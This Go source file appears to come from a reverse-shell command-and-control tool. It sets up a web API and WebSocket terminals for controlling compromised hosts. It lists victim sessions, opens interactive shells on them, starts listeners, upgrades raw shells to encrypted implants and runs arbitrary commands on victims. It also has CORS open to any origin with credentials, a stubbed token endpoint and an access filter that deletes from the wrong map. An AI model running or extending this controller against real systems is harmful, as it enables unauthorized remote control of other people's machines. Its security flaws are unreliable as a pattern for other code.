package context

import (
	"encoding/json"
	"fmt"
	"github.com/WangYihang/Platypus/internal/context/Controller"
	"github.com/WangYihang/Platypus/internal/context/Middlewares"
	"github.com/WangYihang/Platypus/internal/context/Models"
	"github.com/WangYihang/Platypus/internal/util/fs"
	"github.com/WangYihang/Platypus/internal/util/log"
	"github.com/WangYihang/Platypus/internal/util/message"
	"github.com/WangYihang/Platypus/internal/util/str"
	"github.com/gin-contrib/static"
	"gopkg.in/olahol/melody.v1"
	"io/ioutil"
	"strconv"
	"strings"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

type WindowSize struct {
	Columns int
	Rows    int
}

func formExistOrAbort(c *gin.Context, params []string) bool {
	for _, param := range params {
		if c.PostForm(param) == "" {
			return panicRESTfully(c, fmt.Sprintf("%s is required", param))
		}
	}
	return true
}

func paramsExistOrAbort(c *gin.Context, params []string) bool {
	for _, param := range params {
		if c.Param(param) == "" {
			return panicRESTfully(c, fmt.Sprintf("%s is required", param))
		}
	}
	return true
}

func panicRESTfully(c *gin.Context, msg string) bool {
	c.JSON(200, gin.H{
		"status": false,
		"msg":    msg,
	})
	c.Abort()
	return false
}

func CreateRESTfulAPIServer() *gin.Engine {
	gin.SetMode(gin.ReleaseMode)
	gin.DefaultWriter = ioutil.Discard
	endpoint := gin.Default()

	endpoint.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"*"},
		AllowMethods:     []string{"GET", "POST", "DELETE", "PUT", "PATCH"},
		AllowHeaders:     []string{"Origin"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
		MaxAge:           12 * time.Hour,
	}))

	sR := endpoint.Use(Models.Session("golang-tech-stack"))
	sR.GET("/captcha", Controller.CreateCaptcha)
	sR.GET("/login", Controller.LoginGet)
	sR.POST("/login", Controller.LoginPost)
	sR.GET("/register", Controller.RegisterGet)
	sR.POST("/register", Controller.RegisterPost)
	endpoint.GET("/reset", Controller.ResetPasswordGet)
	endpoint.POST("/reset", Controller.ResetPasswordPost)
	// Static files
	endpoint.Use(static.Serve("/", fs.BinaryFileSystem("./web/frontend/build")))
	// WebSocket TTYd
	endpoint.Use(static.Serve("/shell/", fs.BinaryFileSystem("./web/ttyd/dist")))

	// Notify client online event
	notifyWebSocket := melody.New()
	endpoint.GET("/notify", func(c *gin.Context) {
		notifyWebSocket.HandleRequest(c.Writer, c.Request)
	})
	notifyWebSocket.HandleConnect(func(s *melody.Session) {
		log.Info("Notify client conencted from: %s", s.Request.RemoteAddr)
	})

	notifyWebSocket.HandleMessage(func(s *melody.Session, msg []byte) {
		// Nothing to do
	})

	notifyWebSocket.HandleDisconnect(func(s *melody.Session) {
		log.Info("Notify client disconencted from: %s", s.Request.RemoteAddr)
	})
	Ctx.NotifyWebSocket = notifyWebSocket

	// Websocket
	ttyWebSocket := melody.New()
	ttyWebSocket.Upgrader.Subprotocols = []string{"tty"}
	endpoint.GET("/ws/:hash", func(c *gin.Context) {
		if !paramsExistOrAbort(c, []string{"hash"}) {
			return
		}
		client := Ctx.FindTCPClientByHash(c.Param("hash"))
		termiteClient := Ctx.FindTermiteClientByHash(c.Param("hash"))
		if client == nil && termiteClient == nil {
			panicRESTfully(c, "client is not found")
			return
		}
		if client != nil {
			log.Success("Trying to poping up websocket shell for: %s", client.OnelineDesc())
		}
		if termiteClient != nil {
			log.Success("Trying to poping up encrypted websocket shell for: %s", termiteClient.OnelineDesc())
		}
		ttyWebSocket.HandleRequest(c.Writer, c.Request)
	})

	ttyWebSocket.HandleConnect(func(s *melody.Session) {
		// Get client hash
		hash := strings.Split(s.Request.URL.Path, "/")[2]

		// Handle TCPClient
		current := Ctx.FindTCPClientByHash(hash)
		if current != nil {
			s.Set("client", current)
			// Lock
			current.GetInteractingLock().Lock()
			current.SetInteractive(true)

			// Incase somebody is interacting via cli
			current.EstablishPTY()
			// SET_WINDOW_TITLE '1'
			s.WriteBinary([]byte("1" + current.GetShellPath() + " (ubuntu)"))
			// SET_PREFERENCES '2'
			s.WriteBinary([]byte("2" + "{ }"))

			// OUTPUT '0'
			current.Write([]byte("\n"))
			go func(s *melody.Session) {
				for current != nil && !s.IsClosed() {
					current.GetConn().SetReadDeadline(time.Time{})
					msg := make([]byte, 0x100)
					n, err := current.ReadConnLock(msg)
					if err != nil {
						log.Error("Read from socket failed: %s", err)
						return
					}
					s.WriteBinary([]byte("0" + string(msg[0:n])))
				}
			}(s)
			return
		}

		// Handle TermiteClient
		currentTermite := Ctx.FindTermiteClientByHash(hash)
		if currentTermite != nil {
			log.Info("Encrypted websocket connected: %s", currentTermite.OnelineDesc())
			// Start shell process
			s.Set("termiteClient", currentTermite)

			// SET_WINDOW_TITLE '1'
			s.WriteBinary([]byte("1" + currentTermite.GetShellPath() + " (ubuntu)"))
			// SET_PREFERENCES '2'
			s.WriteBinary([]byte("2" + "{ }"))
			// OUTPUT '0'
			key := str.RandomString(0x10)
			s.Set("key", key)

			currentTermite.RequestStartProcess(currentTermite.GetShellPath(), 0, 0, key)

			// Create Process Object
			process := Process{
				Pid:           -2,
				WindowColumns: 0,
				WindowRows:    0,
				State:         startRequested,
				WebSocket:     s,
			}
			currentTermite.AddProcess(key, &process)
			return
		}
	})

	// User input from websocket -> process
	ttyWebSocket.HandleMessageBinary(func(s *melody.Session, msg []byte) {
		// Handle TCPClient
		value, exists := s.Get("client")
		if exists {
			current := value.(*TCPClient)
			if current.GetInteractive() {
				opcode := msg[0]
				body := msg[1:]
				switch opcode {
				case '0': // INPUT '0'
					current.Write(body)
				case '1': // RESIZE_TERMINAL '1'
					// Raw reverse shell does not support resize terminal size when
					// in interactive foreground program, eg: vim
					// var ws WindowSize
					// json.Unmarshal(body, &ws)
					// current.SetWindowSize(&ws)
				case '2': // PAUSE '2'
					// TODO: Pause, support for zmodem
				case '3': // RESUME '3'
					// TODO: Pause, support for zmodem
				case '{': // JSON_DATA '{'
					// Raw reverse shell does not support resize terminal size when
					// in interactive foreground program, eg: vim
					// var ws WindowSize
					// json.Unmarshal([]byte("{"+string(body)), &ws)
					// current.SetWindowSize(&ws)
				default:
					fmt.Println("Invalid message: ", string(msg))
				}
			}
			return
		}

		// Handle TermiteClient
		if termiteValue, exists := s.Get("termiteClient"); exists {
			currentTermite := termiteValue.(*TermiteClient)
			if key, exists := s.Get("key"); exists {
				opcode := msg[0]
				body := msg[1:]
				switch opcode {
				case '0': // INPUT '0'
					err := currentTermite.Send(message.Message{
						Type: message.STDIO,
						Body: message.BodyStdio{
							Key:  key.(string),
							Data: body,
						},
					})

					if err != nil {
						// Network
						log.Error("Network error: %s", err)
						return
					}
				case '1': // RESIZE_TERMINAL '1'
					var ws WindowSize
					json.Unmarshal(body, &ws)

					err := currentTermite.Send(message.Message{
						Type: message.WINDOW_SIZE,
						Body: message.BodyWindowSize{
							Key:     key.(string),
							Columns: ws.Columns,
							Rows:    ws.Rows,
						},
					})

					if err != nil {
						// Network
						log.Error("Network error: %s", err)
						return
					}
				case '2': // PAUSE '2'
					// TODO: Pause, support for zmodem
				case '3': // RESUME '3'
					// TODO: Pause, support for zmodem
				case '{': // JSON_DATA '{'
					var ws WindowSize
					json.Unmarshal([]byte(msg), &ws)

					err := currentTermite.Send(message.Message{
						Type: message.WINDOW_SIZE,
						Body: message.BodyWindowSize{
							Key:     key.(string),
							Columns: ws.Columns,
							Rows:    ws.Rows,
						},
					})

					if err != nil {
						// Network
						log.Error("Network error: %s", err)
						return
					}
				default:
					fmt.Println("Invalid message: ", string(msg))
				}
			} else {
				log.Error("Process has not been started")
			}
		}
	})

	ttyWebSocket.HandleDisconnect(func(s *melody.Session) {
		// Handle TCPClient
		value, exists := s.Get("client")
		if exists {
			current := value.(*TCPClient)
			log.Success("Closing websocket shell for: %s", current.OnelineDesc())
			current.SetInteractive(false)
			current.GetInteractingLock().Unlock()
			return
		}

		// Handle TermiteClient
		termiteValue, exists := s.Get("termiteClient")
		if exists {
			currentTermite := termiteValue.(*TermiteClient)
			if key, exists := s.Get("key"); exists {
				currentTermite.RequestTerminate(key.(string))
			} else {
				log.Error("No such key: %d", key)
				return
			}
		}
	})

	// TODO: Websocket UI Auth (to be implemented)
	endpoint.GET("/token", func(c *gin.Context) {
		c.String(200, "")
	})

	type ServersWithDistributorAddress struct {
		Servers     map[string](*TCPServer) `json:"servers"`
		Distributor Distributor             `json:"distributor"`
	}

	// Server related
	// Simple group: v1
	RESTfulAPIGroup := endpoint.Group("/api")
	RESTfulAPIGroup.Use(Middlewares.Oauth())
	RESTfulAPIGroup.GET("/logout", Controller.LogOut)
	rbacAPIGroup := RESTfulAPIGroup.Group("/rbac")
	rbacAPIGroup.Use(Middlewares.Super())
	{
		rbacAPIGroup.GET("/users", Controller.ListUsers)
		rbacAPIGroup.GET("/user/:user", Controller.ListUserRoles)
		rbacAPIGroup.GET("/roles", Controller.ListRoles)
		rbacAPIGroup.GET("/role/:role", Controller.ListRoleAccesses)
		rbacAPIGroup.POST("/role", Controller.CreateRole)
		rbacAPIGroup.POST("/userRoles", Controller.SaveUserRoles)
		rbacAPIGroup.POST("/roleAccesses", Controller.SaveRoleAccesses)
	}
	{
		serverAPIGroup := RESTfulAPIGroup.Group("/server")
		{
			serverAPIGroup.GET("", func(c *gin.Context) {
				response := ServersWithDistributorAddress{
					Servers:     Ctx.Servers,
					Distributor: *Ctx.Distributor,
				}
				userName, ok := c.Get(Middlewares.CtxUser)
				if !ok {
					return
				}
				accesses := Models.ListAllAccesses(userName.(string))
				for _, server := range response.Servers {
					for k, client := range server.Clients {
						if _, ok := accesses[client.Hash]; !ok {
							delete(server.Clients, k)
						}
					}
					for k, client := range server.TermiteClients {
						if _, ok := accesses[client.Hash]; !ok {
							delete(server.Clients, k)
						}
					}
				}
				c.JSON(200, gin.H{
					"status": true,
					"msg":    response,
				})
				c.Abort()
			})
			serverAPIGroup.GET("/:hash", func(c *gin.Context) {
				if !paramsExistOrAbort(c, []string{"hash"}) {
					return
				}
				hash := c.Param("hash")
				for _, server := range Ctx.Servers {
					if server.Hash == hash {
						c.JSON(200, gin.H{
							"status": true,
							"msg":    server,
						})
						c.Abort()
						return
					}
				}
				panicRESTfully(c, "No such server")
			})
			serverAPIGroup.GET("/:hash/client", func(c *gin.Context) {
				if !paramsExistOrAbort(c, []string{"hash"}) {
					return
				}
				hash := c.Param("hash")
				for _, server := range Ctx.Servers {
					if server.Hash == hash {
						clients := make(map[string]interface{})
						for k, v := range server.Clients {
							clients[k] = v
						}
						for k, v := range server.TermiteClients {
							clients[k] = v
						}
						c.JSON(200, gin.H{
							"status": true,
							"msg":    clients,
						})
						c.Abort()
						return
					}
				}
				panicRESTfully(c, "No such server")
			})
			serverAPIGroup.POST("", func(c *gin.Context) {
				if !formExistOrAbort(c, []string{"host", "port", "encrypted"}) {
					return
				}
				port, err := strconv.Atoi(c.PostForm("port"))
				if err != nil || port <= 0 || port > 65535 {
					panicRESTfully(c, "Invalid port number")
					return
				}
				encrypted, _ := strconv.ParseBool(c.PostForm("encrypted"))
				server := CreateTCPServer(c.PostForm("host"), uint16(port), "", encrypted, true, "", "")
				if server != nil {
					go (*server).Run()
					c.JSON(200, gin.H{
						"status": true,
						"msg":    server,
					})
					c.Abort()
				} else {
					c.JSON(200, gin.H{
						"status": false,
						"msg":    fmt.Sprintf("The server (%s:%d) start failed", c.PostForm("host"), port),
					})
					c.Abort()
				}
			})
			serverAPIGroup.DELETE("/:hash", func(c *gin.Context) {
				if !paramsExistOrAbort(c, []string{"hash"}) {
					return
				}
				hash := c.Param("hash")
				for _, server := range Ctx.Servers {
					if server.Hash == hash {
						Ctx.DeleteServer(server)
						c.JSON(200, gin.H{
							"status": true,
						})
						c.Abort()
						return
					}
				}
				panicRESTfully(c, "No such server")
			})
		}
		clientAPIGroup := RESTfulAPIGroup.Group("/client")
		{

			// Client related
			clientAPIGroup.GET("", func(c *gin.Context) {
				clients := make(map[string]interface{})
				for _, server := range Ctx.Servers {
					for k, v := range server.Clients {
						clients[k] = v
					}
					for k, v := range server.TermiteClients {
						clients[k] = v
					}
				}
				c.JSON(200, gin.H{
					"status": true,
					"msg":    clients,
				})
				c.Abort()
			})
			clientAPIGroup.GET("/:hash", func(c *gin.Context) {
				if !paramsExistOrAbort(c, []string{"hash"}) {
					return
				}
				hash := c.Param("hash")
				for _, server := range Ctx.Servers {
					if client, exist := server.Clients[hash]; exist {
						c.JSON(200, gin.H{
							"status": true,
							"msg":    client,
						})
						c.Abort()
						return
					}
				}
				panicRESTfully(c, "No such client")
			})
			// Upgrade reverse shell client to termite client
			clientAPIGroup.GET("/:hash/upgrade/:target", func(c *gin.Context) {
				if !paramsExistOrAbort(c, []string{"hash", "target"}) {
					return
				}
				hash := c.Param("hash")
				target := c.Param("target")
				// TODO: Check target format
				if target == "" {
					panicRESTfully(c, "Invalid server hash")
					return
				}

				client := Ctx.FindTCPClientByHash(hash)
				if client != nil {
					// Upgrade
					go client.UpgradeToTermite(target)
					c.JSON(200, gin.H{
						"status": true,
						"msg":    fmt.Sprintf("Upgrading client %s to termite", client.OnelineDesc()),
					})
					c.Abort()
					return
				}

				panicRESTfully(c, "No such client")
			})
			clientAPIGroup.DELETE("/:hash", func(c *gin.Context) {
				if !paramsExistOrAbort(c, []string{"hash"}) {
					return
				}
				hash := c.Param("hash")
				for _, server := range Ctx.Servers {
					if client, exist := server.Clients[hash]; exist {
						Ctx.DeleteTCPClient(client)
						c.JSON(200, gin.H{
							"status": true,
						})
						c.Abort()
						return
					}
				}
				panicRESTfully(c, "No such client")
			})
			clientAPIGroup.POST("/:hash", func(c *gin.Context) {
				if !paramsExistOrAbort(c, []string{"hash"}) {
					return
				}
				if !formExistOrAbort(c, []string{"cmd"}) {
					return
				}
				hash := c.Param("hash")
				cmd := c.PostForm("cmd")
				for _, server := range Ctx.Servers {
					if client, exist := server.Clients[hash]; exist {
						if client.GetPtyEstablished() {
							c.JSON(200, gin.H{
								"status": false,
								"msg":    "The client is under PTY mode, please exit pty mode before execute command on it",
							})
						} else {
							c.JSON(200, gin.H{
								"status": true,
								"msg":    client.SystemToken(cmd),
							})
						}
						c.Abort()
						return
					}
					if client, exist := server.TermiteClients[hash]; exist {
						c.JSON(200, gin.H{
							"status": true,
							"msg":    client.System(cmd),
						})
						c.Abort()
						return
					}
				}
				panicRESTfully(c, "No such client")
			})
		}
	}
	return endpoint
}
